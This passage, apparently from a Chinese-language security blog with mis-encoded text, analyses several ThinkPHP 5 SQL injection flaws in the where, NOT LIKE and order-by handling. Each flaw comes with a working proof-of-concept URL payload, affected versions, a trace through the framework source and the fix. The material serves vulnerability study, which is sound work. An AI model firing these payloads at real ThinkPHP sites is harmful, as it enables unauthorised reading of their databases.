class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªå˜é‡å‡å¯æ§ã€‚å½¢å¼ä¸ºï¼š<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>ç°åœ¨å°±æ˜¯æƒ³åŠæ³•å¦‚ä½•é—­åˆï¼Œç„¶åè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>å³è®©<code>$fun</code> ä¸ºæˆ‘ä»¬çš„æ¶æ„Payload å³å¯ã€‚ç„¶åé—­åˆæ‰åé¢çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>ä¸‹å›¾æ¥è‡ªå‚è€ƒèµ„æ–™ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§æœ€æ–°ç‰ˆï¼Œ</p><p>å®˜æ–¹ç›´æ¥åˆ äº†<code>parseArrayDate</code> å‡½æ•°ã€‚</p><blockquote><p>ä¸€ç‚¹ç‚¹æ„Ÿæƒ³ï¼Œæˆ‘æ„Ÿè§‰æŒ‰ç…§è¿™ä¸ªå¸ˆå‚…çš„åˆ†ææ€è·¯ï¼Œæ˜¯é€†ç€payload å»åˆ†æçš„æ¼æ´åŸå› ï¼Œæˆ‘å¥½æƒ³æ­£é¢ç›´æ¥æŒ–å•Šï¼Œèœæ­»äº†ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥ä¸‰-select"><a href="#SQLæ³¨å…¥ä¸‰-select" class="headerlink" title="SQLæ³¨å…¥ä¸‰(select)"></a>SQLæ³¨å…¥ä¸‰(select)</h1><p>æ–°å¢å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>å­¦ä¹ å°±æ˜¯è¦å­¦ä¹ ä¸åŒå¤§ä½¬çš„æ€è·¯ï¼Œç„¶åè½¬æ¢ä¸ºè‡ªå·±çš„æ€è·¯ã€‚</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap ä¹Ÿå¯ä»¥è·‘å‡ºç»“æœã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>ThinkPHP5 å…¨ç‰ˆæœ¬</p><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><ul><li>MySQL ç›‘æ§</li></ul><blockquote><p>ç›‘æ§ä¸åˆ°ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚é…ç½®ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>ç„¶åç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ SQL æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ Query ç±»çš„ where æ–¹æ³•ï¼Œé€šè¿‡å…¶ parseWhereExp æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ select æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º select è¯­å¥ã€‚ï¼ˆè¿™ä¸ªç‚¹å¾—è®°ä½ï¼Œæ¡†æ¶çš„sqlæŸ¥è¯¢æ–¹æ³•å…ˆè¿›å…¥ Query ç±»ï¼‰</p></blockquote><hr><blockquote><p>ç¨‹åºé»˜è®¤è°ƒç”¨ <strong>Request</strong> ç±»çš„ <strong>get</strong> æ–¹æ³•ä¸­ä¼šè°ƒç”¨è¯¥ç±»çš„ <strong>input</strong> æ–¹æ³•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•é»˜è®¤æƒ…å†µä¸‹å¹¶æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ <strong>SQL</strong> æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>æ­¤å¤„è°ƒç”¨<code>$this-&gt;builder</code>çš„<code>select</code>æ–¹æ³•ã€‚è€Œæ­¤å¤„<code>$this-&gt;builder</code> ä¸º<code>think/db/builder/Mysql</code> ç±»ï¼Œç»§æ‰¿äº<code>Builder</code> ç±»ã€‚å› æ­¤è°ƒç”¨çš„æ˜¯<code>Builder</code>ç±»çš„<code>select</code> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>åœ¨ <strong>select</strong> æ–¹æ³•ä¸­ï¼Œç¨‹åºä¼šå¯¹ <strong>SQL</strong> è¯­å¥æ¨¡æ¿ç”¨å˜é‡å¡«å……ï¼Œå…¶ä¸­ç”¨æ¥å¡«å…… <strong>%WHERE%</strong> çš„å˜é‡ä¸­å­˜åœ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚è·Ÿè¿›è¿™ä¸ª <strong>where</strong> åˆ†æå‡½æ•°ï¼Œä¼šå‘ç°å…¶ä¼šè°ƒç”¨ç”ŸæˆæŸ¥è¯¢æ¡ä»¶ <strong>SQL</strong> è¯­å¥çš„ <strong>buildWhere</strong> å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>æ­¤å¤„<code>$where</code> ç»è¿‡ <code>buildWhere</code> æ–¹æ³•å¤„ç†åè¿”å›<code>$whereStr</code></p><p><code>parseWhereItem</code> çš„ <code>where</code>  å­å•å…ƒå‡½æ•°æ–¹æ³•è°ƒç”¨ï¼Œå½“æ“ä½œç¬¦ä¸º<code>EXP</code> æ—¶ï¼Œç»è¿‡æ‹¼æ¥å¸¦å…¥SQLæŸ¥è¯¢ï¼Œé€ æˆSQLæ³¨å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>å®Œæ•´çš„æ–¹æ³•è°ƒç”¨å¦‚ä¸Šå›¾ç»¿è‰²éƒ¨åˆ†ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜ç½‘æœªä¿®å¤ã€‚</p><blockquote><p>ç»§æ‰¿ç±»ï¼Œç­‰é¢å‘å¯¹è±¡çš„åŸºæœ¬çŸ¥è¯†å¾ˆé‡è¦ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥å››-select"><a href="#SQLæ³¨å…¥å››-select" class="headerlink" title="SQLæ³¨å…¥å››(select)"></a>SQLæ³¨å…¥å››(select)</h1><p>æ¼æ´å¤ç°ç¯å¢ƒå’Œä¸Šé¢åº”è¯¥æ˜¯å·®ä¸å¤šçš„ã€‚</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="å½±å“ç‰ˆæœ¬-3"><a href="#å½±å“ç‰ˆæœ¬-3" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="æ¼æ´æ¦‚è¿°-3"><a href="#æ¼æ´æ¦‚è¿°-3" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ã€‚å†ä¸€ä¸ªï¼Œ <strong>Request</strong> ç±»çš„ <strong>filterValue</strong> æ–¹æ³•æ¼è¿‡æ»¤ <strong>NOT LIKE</strong> å…³é”®å­—ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p></blockquote><p>åœ¨MySQL ä¸­ <code>NOT LIKE</code>  ä¸ºæ¨¡ç³ŠæŸ¥è¯¢ï¼Œä»€ä¹ˆæ˜¯æ¨¡ç³ŠæŸ¥è¯¢å‘¢ï¼Ÿ</p><blockquote><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢likeçš„ç”¨æ³•:</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name like â€˜%ç‹%â€™</p><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢not likeçš„ç”¨æ³•</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æ²¡æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name not like â€˜%ç‹%â€™</p></blockquote><h2 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¯¥SQLæ³¨å…¥æ¼æ´å½±å“ç‰ˆæœ¬ä¸º <code>5.0.10</code> ï¼Œå› æ­¤å» <code>5.0.11</code> çš„æ›´æ–°è®°å½•ä¸­ï¼Œåˆ™å¯ä»¥æŸ¥çœ‹ç›¸å…³çš„ä¿®å¤æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ï¼š<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>ï¼ˆ æ€¥éœ€å¦‚ä½•å¿«é€Ÿå®šä½åˆ° æŸä¸ªæŒ‡å®šçš„commit è®°å½•çš„æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä¹‹å‰æ˜¯æ²¡æœ‰å°†ç‰¹æ®Šå­—ç¬¦ <code>NOT LIKE</code>   ç»™è¿‡æ»¤æ‰ã€‚</p><hr><p>æ ¹æ®Payloadæ¥åˆ†ææ¼æ´åŸç†ï¼š</p><blockquote><p>ä¸ç®¡ä»¥å“ªç§æ–¹å¼ä¼ é€’æ•°æ®ç»™æœåŠ¡å™¨ï¼Œè¿™äº›æ•°æ®åœ¨ <strong>ThinkPHP</strong> ä¸­éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•</p></blockquote><p>åœ¨<code>input</code> æ–¹æ³•ä¸­ï¼šä¼ å…¥çš„æ•°æ®ä¼šç»è¿‡ filterValueè¿‡æ»¤<code>å’Œ </code>å¼ºåˆ¶ç±»å‹è½¬æ¢,ç„¶åè¿”å›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>è·Ÿè¿›è¯¥æ–¹æ³•ï¼ŒæŸ¥çœ‹æ˜¯å¦‚ä½•å®ç°çš„ã€‚å‘ç°åˆä¼šè°ƒç”¨åˆ°<code>filterExp</code>  æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰è¿‡æ»¤<code>NOT LIKE</code></p><blockquote><p>ThinkPHPå¤„ç† <strong>SQL</strong> è¯­å¥çš„æ–¹æ³•ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>æ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ã€‚è€Œ<code>Mysql</code> ç±»ç»§æ‰¿äº <code>Builder</code>ç±»ï¼Œæ‰€ä»¥ä¼šç»§ç»­è°ƒç”¨åˆ°<code>Builder</code>ç±»çš„<code>select</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>parseWhere</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†<code>buildWhere</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>parseWhereItem</code> æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>æ­¤å¤„åˆ° æ“ä½œç¬¦ <code>$exp</code> ä¸º <code>NOT LIKE</code> æˆ– <code>LIKE</code> æ—¶ï¼ŒMySQL çš„é€»è¾‘æ§åˆ¶ç¬¦å¯æ§ã€‚åè¿›è¡Œæ‹¼æ¥è¿”å›å¸¦å…¥SQLè¯­å¥ä¸­æ‰§è¡Œï¼Œå¯¼è‡´äº†SQLæ³¨å…¥æ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>æœ€ç»ˆçš„ç»“æœå°±æ˜¯è¿”å›å¸¦æœ‰æ¶æ„çš„SQL Payloadï¼ˆ<code>whereStr</code>ï¼Œçº¢è‰²éƒ¨åˆ†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>æ•´ä¸ªè¿‡ç¨‹çš„æ–¹æ³•è°ƒç”¨æƒ…å†µå¦‚ç»¿è‰²æ¡†èµ·çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-3"><a href="#åˆ©ç”¨æ€»ç»“-3" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>ä¸‹å›¾æ¥è‡ªä¸ƒæœˆç«å¸ˆå‚…çš„æ€»ç»“æ–‡ç« é‡Œçš„ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="æ¼æ´ä¿®å¤-3"><a href="#æ¼æ´ä¿®å¤-3" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å¢åŠ è¿‡æ»¤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQLæ³¨å…¥äº”-order-by"><a href="#SQLæ³¨å…¥äº”-order-by" class="headerlink" title="SQLæ³¨å…¥äº”(order by)"></a>SQLæ³¨å…¥äº”(order by)</h1><p>ç¯å¢ƒæ­å»ºä¹Ÿå·®ä¸å¤šï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯<code>../config/app.php</code> ä¸‹çš„<code>app_debug</code> å’Œ <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="å½±å“ç‰ˆæœ¬-4"><a href="#å½±å“ç‰ˆæœ¬-4" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="æ¼æ´æ¦‚è¿°-4"><a href="#æ¼æ´æ¦‚è¿°-4" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <code>Builder</code> ç±»çš„ <code>parseOrder</code> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› SQL è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ SQLæ³¨å…¥æ¼æ´ çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-4"><a href="#æ¼æ´åˆ†æ-4" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>ä»ä¿®æ”¹è®°å½•ä¸­çœ‹åˆ°ï¼Œå¢åŠ äº†ä¸€æ¡ifåˆ¤æ–­è¯­å¥æ¥è¿‡æ»¤<code>$key</code>ä¸­çš„<code>)</code> å’Œ <code>#</code>  ã€‚è¿™ä¸¤ä¸ªç¬¦å·ä¹Ÿæ˜¯åœ¨CTFä¸­å¾€å¾€ä¼šè¿‡æ»¤çš„ç‚¹ã€‚</p><p>æˆ‘ä»¬çš„æ•°æ®éƒ½ä¼šè¿›å…¥åˆ°<code>Request</code> ç±»ä¸­çš„<code>input</code>æ–¹æ³•ï¼Œå¹¶ä¸”ç»è¿‡<code>filterValue</code>æ–¹æ³•çš„è¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢å¹¶è¿”å›<code>$data</code>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>è¿™é‡Œ<code>array_walk_recursive()</code>å‡½æ•°ï¼Œå¯¹æ•°ç»„ä¸­çš„æˆå‘˜é€’å½’è°ƒç”¨<code>filterValue</code> è¿‡æ»¤å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>ä½†æ˜¯<code>filterValue</code> è¿‡æ»¤å‡½æ•°ï¼Œä¸è¿‡æ»¤æ•°ç»„çš„<code>key</code> ï¼Œ åªè¿‡æ»¤äº†æ•°ç»„çš„<code>value</code> ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ¡†æ¶çš„ SQLæŸ¥è¯¢æ–¹æ³•ä¸­ï¼Œè¿›å…¥<code>Query</code>ç±»ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡è°ƒç”¨<code>order</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>æ¶æ„Payload æœªç»è¿‡ä»»ä½•è¿‡æ»¤ç›´æ¥ä¼ é€’ç»™<code>options[&#39;order&#39;]</code> ä¸­ã€‚æ¥ç€è°ƒç”¨<code>find()</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>æ­¤å¤„<code>$this-&gt;connection</code> æ˜¯<code>think/db/connectior/Mysql</code>ç±» ï¼Œç»§æ‰¿äº<code>Connection</code>ç±»ï¼Œäºæ˜¯æ­¤å¤„ç»§ç»­è°ƒç”¨è¯¥ç±»çš„<code>find()</code>æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>è¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>$this-&gt;builder</code>, å³<code>think/db/builder/Mysql</code> ç±»çš„<code>select</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•é€šè¿‡<code>str_replace</code> å‡½æ•°ï¼Œå°†æ•°æ®å¡«å……åˆ°SQLè¯­å¥ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span 